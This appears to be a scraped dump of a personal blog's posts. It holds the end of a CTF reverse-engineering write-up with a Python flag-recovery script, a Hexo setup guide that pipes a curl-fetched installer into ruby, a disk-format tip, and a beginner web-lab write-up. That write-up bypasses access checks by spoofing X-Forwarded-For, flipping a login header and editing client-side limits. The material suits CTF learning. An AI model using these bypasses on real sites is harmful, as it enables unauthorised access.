1234567891011121314151617181920212223242526272829303132333435import numpy as npkey = [0x0000002B, 0x00000016, 0x0000001E, 0x00000053, 0x00000035, 0x00000039, 0x00000020, 0x00000029, 0x00000035, 0x00000063, 0x0000000A, 0x00000028, 0x0000002C, 0x00000006, 0x00000032, 0x0000002A, 0x00000055, 0x00000039, 0x00000014, 0x0000005F, 0x00000020, 0x00000019, 0x00000034, 0x00000021, 0x00000019, 0x0000000B, 0x0000005A, 0x00000009, 0x00000050, 0x00000034, 0x0000006F, 0x0000005C, 0x00000016, 0x0000001A, 0x00000068, 0x00000063, 0x00000034, 0x0000004E, 0x00000016, 0x00000045, 0x0000004C, 0x00000053, 0x0000002F, 0x0000003F, 0x0000003F, 0x00000028, 0x00000069, 0x00000051, 0x00000039, 0x00000044, 0x00000012, 0x00000024, 0x0000000A, 0x0000004D, 0x00000055, 0x00000031, 0x00000049, 0x0000003B, 0x00000040, 0x0000003B, 0x00000043, 0x00000028, 0x00000021, 0x00000036]enc = [0x00009A06, 0x0000879A, 0x00007DC4, 0x00008F1F, 0x000088AC, 0x0000850B, 0x0000785D, 0x0000822E, 0x00008FBC, 0x00007F69, 0x000081E5, 0x00008714, 0x00008572, 0x00008786, 0x00006A94, 0x000076FE, 0x0000A871, 0x00009A1E, 0x0000967E, 0x00009D97, 0x00009D4B, 0x00009AC6, 0x00007E38, 0x00008C62, 0x0000CD4A, 0x00009116, 0x0000A837, 0x0000A960, 0x0000A3A7, 0x00009B7E, 0x0000AC9C, 0x0000AB9E, 0x0000C94C, 0x0000AD7C, 0x0000A2C8, 0x0000BD86, 0x0000B1ED, 0x0000AD94, 0x0000A195, 0x0000AFE8, 0x0000ED71, 0x0000C239, 0x0000CD7E, 0x0000D459, 0x0000CEFF, 0x0000CBBC, 0x0000B972, 0x0000C36F, 0x0000A82A, 0x000089EF, 0x00008CBF, 0x00009AD1, 0x0000868F, 0x000086A6, 0x00007A26, 0x00007CD2, 0x0000C000, 0x0000A97A, 0x0000A470, 0x0000B3C8, 0x0000AFE5, 0x0000ABB9, 0x00008F7D, 0x0000A70A]key = np.mat(key).reshape(8, 8)enc = np.mat(enc).reshape(8, 8)# enc = key * out# out = key逆 * encout = key.I * encout = out.reshape(1, 64).tolist()[0]for i in range(len(out)): out[i] = int(round(out[i]))print outflag = ''for i in range(len(out)): flag += chr(out[i])print flagdef rot13(s): out = '' for ch in s: tmp = ord(ch) + 13 if ch.isupper(): if tmp &gt; 90: tmp -= 26 elif ch.islower(): if tmp &gt; 122: tmp -= 26 else: tmp = ord(ch) out += chr(tmp) return outflag = rot13(flag)print 'flag:', flag CRYPTO贝斯家族永不言败各种base解码。 壮壮可能是疯了…通过猪圈密码解开第一步。 MISC这是神魔鬼词频题，解码网站在这里。 表情包10块钱用stegsolve打开gif逐帧查看，快速看过260+的图像后，收集到一张二维码的四片碎片，用美图秀秀拼接起来，再XOR一下，扫码得到flag。 童年用金手指作弊通关魂斗罗得到flag。 参考网站https://esebanana.github.io/2018/05/07/wp_2018_5_7_zjgsctf/https://bbs.pediy.com/thread-158896.htmhttps://esebanana.github.io/2018/04/08/re_10_tls_smc/https://esebanana.github.io/2018/04/12/re_11_tou_ke/https://www.52pojie.cn/thread-593356-1-1.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"Mac下利用hexo和github搭建博客","slug":"Mac下利用hexo和github搭建博客","date":"2018-04-17T12:50:09.000Z","updated":"2018-10-06T05:51:38.423Z","comments":true,"path":"2018/04/17/Mac下利用hexo和github搭建博客/","link":"","permalink":"https://qianfei11.github.io/2018/04/17/Mac下利用hexo和github搭建博客/","excerpt":"把双系统的win10删了，改用mac。发现自己的博客忘记备份了，只好在mac上重新搭建一个。","text":"把双系统的win10删了，改用mac。发现自己的博客忘记备份了，只好在mac上重新搭建一个。 安装流程： 1.hexo是基于nodejs的，需安装nodejs，安装nodejs最好选择homebrew 2.首先查看电脑是否安装ruby，因为homebrew安装依赖ruby 3.安装顺序：homebrew-&gt;nodejs-&gt;hexo 安装homebrew1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 安装nodejs1brew install node 安装hexo1sudo npm install -g hexo 创建文件夹123mkdir blogcd bloghexo init 生成一套静态网页12hexo generatehexo server 在localhost的4000端口上就能看到本地搭建的博客 撰写博客1hexo new post &quot;balabala&quot; ‘balabala’即为博文的名字。 修改配置1234deploy: type: git repo: https://github.com/xxx/xxx.github.io branch: master 直接在_config.yml中修改配置（xxx为github的name） 安装hexo-deployer-git1npm install hexo-deployer-git --save 同步github1hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 这样基础的搭建就完成啦！","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://qianfei11.github.io/tags/hexo/"},{"name":"github","slug":"github","permalink":"https://qianfei11.github.io/tags/github/"},{"name":"mac","slug":"mac","permalink":"https://qianfei11.github.io/tags/mac/"}]},{"title":"解决复制文件时对于目标文件系统文件过大","slug":"解决复制文件时对于目标文件系统文件过大","date":"2018-02-26T09:00:34.000Z","updated":"2018-10-06T08:08:26.368Z","comments":true,"path":"2018/02/26/解决复制文件时对于目标文件系统文件过大/","link":"","permalink":"https://qianfei11.github.io/2018/02/26/解决复制文件时对于目标文件系统文件过大/","excerpt":"今天在复制一个文件到U盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个4G多的文件就这样不能够被复制到目标目录下了。","text":"今天在复制一个文件到U盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个4G多的文件就这样不能够被复制到目标目录下了。 其实这是目标硬盘的格式不正确的原因，我这个U盘格式是FAT32，应该将其修改成NTFS格式就可以了。 修改方法：在cmd中输入convert M:/fs:ntfs，其中‘M’是所在的磁盘，按回车键。 格式转换完成，再次复制文件，即可成功！","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"网络安全实验室-基础关-writeup","slug":"网络安全实验室-基础关-writeup","date":"2017-11-19T12:51:38.000Z","updated":"2018-11-11T05:05:11.547Z","comments":true,"path":"2017/11/19/网络安全实验室-基础关-writeup/","link":"","permalink":"https://qianfei11.github.io/2017/11/19/网络安全实验室-基础关-writeup/","excerpt":"第一次写wp，主要是一些web题。","text":"第一次写wp，主要是一些web题。 第一题key在哪里？分值: 100过关地址 第二题再加密一次你就得到key啦~分值: 150加密之后的数据为xrlvf23xfqwsxsqf 第三题猜猜这是经过了多少次加密？分值: 200加密后的字符串为: Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0= base64解码，python引用base64库写脚本(共经过了20次解码) 12345678import base64s = input()try: while True: s = base64.decodestring(s)except Exception: print s 第四题据说MD5加密很安全，真的是么？分值: 200e0960851294d7b2253978ba858e24633 第五题种族歧视分值: 300小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！通关地址 第六题HAHA浏览器分值: 200据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？通关地址 第七题key究竟在哪里呢？分值: 200上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？通关地址 第八题key又找不到了分值: 350小明这次可真找不到key去哪里了，你能帮他找到key吗？通关地址 最初判断中间很快地跳过了一个页面。headers中发现原本应该转到key_is_here_now.php，但通过location转到了index_no_key.php，拼接url后找到key 第九题冒充登陆用户分值: 200小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？通关地址 将headers中的login=0改为login=1就能得到key 第十题比较数字大小分值: 100只要比服务器上的数字大就可以了！通关地址 将网页源代码中的maxlength更改后重新打开网页输入大于999的数字得到key 第十一题本地的诱惑分值: 200小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？通关地址 X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。 在headers中添加X-Forwarded-For：127.0.0.1，然后就能在response里得到key。 第十二题就不让你访问分值: 150小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!通关地址 Robots协议（也称为爬虫协议、机器人协议等）全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。 通过爬虫协议发现有disallow的地方，就尝试进去。又发现有提示login 